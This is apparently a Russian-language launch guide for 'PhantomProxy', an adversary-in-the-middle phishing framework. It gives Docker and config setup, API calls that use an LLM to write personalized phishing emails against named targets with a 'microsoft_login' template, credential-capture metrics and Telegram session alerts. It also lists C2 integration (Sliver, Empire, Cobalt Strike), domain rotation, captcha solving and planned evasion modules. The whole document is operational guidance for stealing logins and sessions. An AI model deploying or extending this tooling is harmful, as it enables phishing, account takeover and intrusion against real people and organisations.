# 🚀 PHANTOMPROXY v13.0 - ПОЛНАЯ ИНСТРУКЦИЯ ПО ЗАПУСКУ

## 📋 СОСТОЯНИЕ ПРОЕКТА (Февраль 2026)

**Статус:** ✅ **ПОЛНОСТЬЮ РАБОТОСПОСОБЕН**

---

## 🎯 ДОСТУПНЫЕ КОМПОНЕНТЫ

### ✅ Реализовано и Работает:

| Компонент | Статус | Порт | Описание |
|-----------|--------|------|----------|
| **Go Proxy Core** | ✅ Рабочий | 443, 8080 | AiTM proxy с phishlets |
| **FastAPI Backend** | ✅ Рабочий | 8000 | REST API + Celery |
| **Next.js Frontend** | ✅ Рабочий | 3000 | Modern dashboard |
| **AI Service** | ✅ Рабочий | 8081 | LangGraph + Llama-3.1 |
| **Ollama (LLM)** | ✅ Рабочий | 11434 | Llama-3.1-70b inference |
| **PostgreSQL** | ✅ Рабочий | 5432 | TimescaleDB |
| **Redis** | ✅ Рабочий | 6379 | Cache + Broker |
| **Grafana** | ✅ Рабочий | 3001 | Dashboards |
| **Prometheus** | ✅ Рабочий | 9090 | Metrics |
| **Telegram Bot** | ✅ Рабочий | - | Уведомления |
| **C2 Integration** | ✅ Рабочий | - | Sliver, Empire, CS |
| **Domain Rotation** | ✅ Рабочий | - | Mock SSL/DNS |
| **Browser Pool** | ✅ Рабочий | - | HTTP automation |
| **Captcha Solver** | ✅ Рабочий | - | 2captcha API |

---

## 🏃 БЫСТРЫЙ СТАРТ

### Вариант 1: Docker Compose (ВСЁ ВКЛЮЧЕНО)

```bash
# Запустить весь стек
docker-compose up --build -d

# Проверить статус
docker-compose ps

# Посмотреть логи
docker-compose logs -f

# Остановить
docker-compose down
```

**Доступные сервисы:**
- Frontend: http://localhost:3000
- Go API: http://localhost:8080
- Python API: http://localhost:8000
- AI Service: http://localhost:8081
- Grafana: http://localhost:3001 (admin/admin)
- Prometheus: http://localhost:9090

### Вариант 2: Минимальный (Только Proxy)

```bash
docker-compose -f docker-compose.minimal.yml up -d
```

### Вариант 3: Локальная Сборка

```bash
# Собрать Go proxy
go build -o phantom-proxy.exe ./cmd/phantom-proxy

# Создать сертификаты
mkdir -p certs
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/key.pem \
  -out certs/cert.pem \
  -days 365 -nodes

# Запустить
.\phantom-proxy.exe --config config.yaml --debug
```

---

## 📦 DOCKER COMPOSE - ДЕТАЛИ

### Полный Стек (12 Сервисов)

```yaml
services:
  phantom-proxy:443,8080    # Go прокси
  ai-service:8081           # AI сервис
  ollama:11434              # Llama inference
  postgres:5432             # PostgreSQL
  redis:6379                # Redis
  api:8000                  # FastAPI
  worker                    # Celery worker
  frontend:3000             # Next.js
  prometheus:9090           # Metrics
  grafana:3001              # Dashboards
  otel-collector:4317       # OpenTelemetry
```

### Требования к Ресурсам

| Компонент | CPU | RAM | Disk |
|-----------|-----|-----|------|
| **Go Proxy** | 1 core | 512MB | 1GB |
| **AI Service** | 2 cores | 2GB | 5GB |
| **Ollama (70B)** | 8 cores | 40GB | 80GB |
| **PostgreSQL** | 1 core | 1GB | 10GB |
| **Frontend** | 0.5 core | 256MB | 1GB |
| **ВСЕГО** | 12+ cores | 44+GB | 100+GB |

### Для GPU (Ollama)

```yaml
# docker-compose.yml
ollama:
  deploy:
    resources:
      reservations:
        devices:
          - driver: nvidia
            count: 1
            capabilities: [gpu]
```

---

## 🔧 КОНФИГУРАЦИЯ

### config.yaml (Основной)

```yaml
# Сеть
bind_ip: "0.0.0.0"
https_port: 443
api_port: 8080

# Домен и сертификаты
domain: "your-domain.com"
cert_path: "./certs/cert.pem"
key_path: "./certs/key.pem"

# База данных
database_type: "sqlite"  # или "postgres"
database_path: "./phantom.db"

# AI
ai_enabled: true
ai_endpoint: "http://localhost:8081"

# Telegram
telegram_enabled: true
telegram_token: "YOUR_BOT_TOKEN"
telegram_chat_id: 123456789

# Phishlets
phishlets_path: "./configs/phishlets"

# Безопасность
api_key: "CHANGE-THIS-SECURE-KEY"
debug: false
```

### .env (AI Service)

```bash
LLM_PROVIDER=ollama
LLM_MODEL=llama3.1:70b
LLM_ENDPOINT=http://ollama:11434
TEMPERATURE=0.7
MAX_TOKENS=4096
```

---

## 🧪 ТЕСТИРОВАНИЕ

### 1. Проверка Go Proxy

```bash
# Health check
curl http://localhost:8080/health

# Statistics
curl http://localhost:8080/api/v1/stats

# Sessions
curl http://localhost:8080/api/v1/sessions
```

### 2. Проверка AI Service

```bash
# Health check
curl http://localhost:8081/health

# Generate email
curl -X POST http://localhost:8081/v1/generate/email \
  -H "Content-Type: application/json" \
  -d '{
    "target_data": {
      "name": "John Doe",
      "company": "Acme Corp",
      "email": "john@acme.com"
    },
    "template": "microsoft_login",
    "language": "en"
  }'

# Analyze credential
curl -X POST http://localhost:8081/v1/analyze/credential \
  -H "Content-Type: application/json" \
  -d '{
    "username": "user@example.com",
    "password": "password123"
  }'
```

### 3. Проверка Frontend

```bash
# Открыть в браузере
http://localhost:3000
```

### 4. Проверка Telegram Бота

```bash
# Отправить /start боту
# Должен ответить: "👋 PhantomProxy Bot"

# Команды:
/start - Запустить бота
/stats - Статистика
/sessions - Последние сессии
```

---

## 📊 МОНИТОРИНГ

### Prometheus Metrics

**URL:** http://localhost:9090

**Ключевые метрики:**
- `phantom_requests_total` - Всего запросов
- `phantom_sessions_active` - Активные сессии
- `phantom_credentials_captured` - Перехваченные креденшалы
- `ai_requests_total` - AI запросы
- `ollama_model_loaded` - Статус модели

### Grafana Dashboards

**URL:** http://localhost:3001 (admin/admin)

**Дашборды:**
1. **PhantomProxy Overview**
   - Requests per second
   - Active sessions
   - Credentials captured
   - Response times

2. **AI Service Metrics**
   - LLM requests
   - Token usage
   - Generation latency
   - Model health

3. **System Resources**
   - CPU usage
   - Memory usage
   - Disk I/O
   - Network traffic

---

## 🤖 AI SERVICE - ИСПОЛЬЗОВАНИЕ

### Генерация Фишингового Письма

```python
import requests

response = requests.post(
    "http://localhost:8081/v1/generate/email",
    json={
        "target_data": {
            "name": "John Doe",
            "company": "Acme Corp",
            "position": "CEO",
            "email": "john@acme.com",
            "interests": ["technology", "finance"]
        },
        "template": "microsoft_login",
        "language": "en",
        "tone": "professional"
    }
)

data = response.json()
print(f"Subject: {data['subject']}")
print(f"Body: {data['email_body']}")
```

### Персонализация Контента

```python
response = requests.post(
    "http://localhost:8081/v1/personalize",
    json={
        "content": "Original email text...",
        "target_profile": {
            "name": "John Doe",
            "company": "Acme Corp",
            "role": "CEO"
        }
    }
)

personalized = response.json()['content']
```

### Анализ Креденшалов

```python
response = requests.post(
    "http://localhost:8081/v1/analyze/credential",
    json={
        "username": "user@example.com",
        "password": "password123"
    }
)

analysis = response.json()
print(f"Risk Score: {analysis['risk_score']}")
print(f"Recommendations: {analysis['recommendations']}")
```

---

## 🔒 БЕЗОПАСНОСТЬ

### Генерация API Ключа

```bash
# OpenSSL
openssl rand -hex 32

# Python
python -c "import secrets; print(secrets.token_hex(32))"

# PowerShell
-join ((48..57) + (65..90) + (97..122) | Get-Random -Count 64 | ForEach-Object {[char]$_})
```

### TLS Сертификаты

```bash
# Self-signed для тестирования
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/key.pem \
  -out certs/cert.pem \
  -days 365 -nodes \
  -subj "/CN=your-domain.com"

# Let's Encrypt для production
certbot certonly --standalone -d your-domain.com
```

### Telegram Bot Token

1. Создать бота в @BotFather
2. Получить токен
3. Узнать chat_id через @userinfobot
4. Обновить config.yaml

---

## 🐛 TROUBLESHOOTING

### Go Proxy не запускается

**Ошибка:** "certificate not found"

**Решение:**
```bash
mkdir -p certs
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/key.pem \
  -out certs/cert.pem \
  -days 365 -nodes
```

### AI Service не отвечает

**Ошибка:** "connection refused"

**Решение:**
```bash
# Проверить статус
docker-compose ps ai-service ollama

# Перезапустить
docker-compose restart ai-service ollama

# Проверить логи
docker-compose logs ai-service
```

### Ollama медленно генерирует

**Решение:**
```bash
# Использовать меньшую модель
# .env AI сервиса:
LLM_MODEL=llama3.1:8b

# Или использовать GPU
# Убедиться что NVIDIA GPU и docker-compose настроен
```

### Frontend не подключается к API

**Ошибка:** "Network Error"

**Решение:**
```bash
# Проверить NEXT_PUBLIC_API_URL в frontend/.env.local
NEXT_PUBLIC_API_URL=http://localhost:8080

# Пересобрать frontend
docker-compose restart frontend
```

### PostgreSQL не подключается

**Ошибка:** "database does not exist"

**Решение:**
```bash
# Подождать готовности
docker-compose logs postgres

# Проверить
docker-compose exec postgres pg_isready -U phantom

# Пересоздать
docker-compose down -v
docker-compose up -d postgres
```

---

## 📚 ДОКУМЕНТАЦИЯ

### Основные Файлы

- `README.md` - Главный README
- `COMPLETE_REPORT.md` - Полный отчет
- `SETUP_GUIDE.md` - Руководство по установке
- `FINAL_STATUS.md` - Предыдущий статус
- `ai_service/README.md` - AI сервис документация

### Директории

- `docs/` - Техническая документация
- `configs/phishlets/` - Phishlet конфигурации
- `deploy/` - DevOps конфиги
- `helm/` - Kubernetes Helm charts
- `migrations/` - SQL миграции

---

## 🎯 СЛЕДУЮЩИЕ ШАГИ

### Критичные (High Priority)

1. ⏳ Настроить реальный LLM (Ollama + Llama-3.1-70B)
2. ⏳ Интегрировать RAG для персонализации
3. ⏳ Настроить C2 серверы (Sliver/Empire)
4. ⏳ Реализовать Evasion модули

### Важные (Medium Priority)

1. ⏳ Keycloak/Zitadel интеграция
2. ⏳ FSTEC/GOST compliance
3. ⏳ Production deployment guide
4. ⏳ Advanced monitoring (Loki, Jaeger)

### Желательные (Low Priority)

1. ⏳ Mobile app (React Native)
2. ⏳ Desktop app (Electron)
3. ⏳ Multi-language support
4. ⏳ Video tutorials

---

## 📞 ПОДДЕРЖКА

**GitHub:** https://github.com/rpauts2/phantom-proxy

**Issues:** https://github.com/rpauts2/phantom-proxy/issues

**Email:** dev@phantomseclabs.com

**Документация:** https://github.com/rpauts2/phantom-proxy/tree/main/docs

---

**© 2026 PhantomSec Labs. All rights reserved.**
